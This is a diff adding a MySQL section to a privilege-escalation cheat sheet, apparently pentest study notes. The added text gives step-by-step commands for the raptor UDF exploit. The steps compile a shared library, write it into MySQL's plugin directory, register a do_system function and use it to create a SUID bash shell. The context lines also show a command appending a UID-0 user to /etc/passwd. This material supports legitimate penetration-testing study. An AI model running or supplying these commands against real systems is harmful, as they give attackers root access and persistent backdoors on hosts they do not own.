@@ -1364,6 +1364,33 @@ AK24fcSx2Il3I
 student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
 ```
 
+### MySQL
+
+raptor exploit for privesc [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)
+
+<pre class="language-bash"><code class="lang-bash">#compile the exploit code
+<strong>gcc -g -c raptor_udf2.c  
+</strong>#create the shared library (so)
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+
+xxd -p raptor_udf2.so | tr -d '\n' > raptor_udf2.so.hex
+</code></pre>
+
+```sql
+set @shell = 0x[raptor_udf2.so.hex content]
+select @@plugin_dir
+select binary @shell into dumpfile '[ @@plugin_dir ]/raptor_udf2.so';
+# select binary @shell into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+## alternative
+mysql> create table foo(line blob);
+mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));
+mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
+##
+
+create function do_system returns integer soname 'raptor_udf2.so';
+select do_system('cp /bin/bash /tmp/bash; chmod u+s /tmp/bash');
+```
+
 ### JuicyPotato
 
 when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges
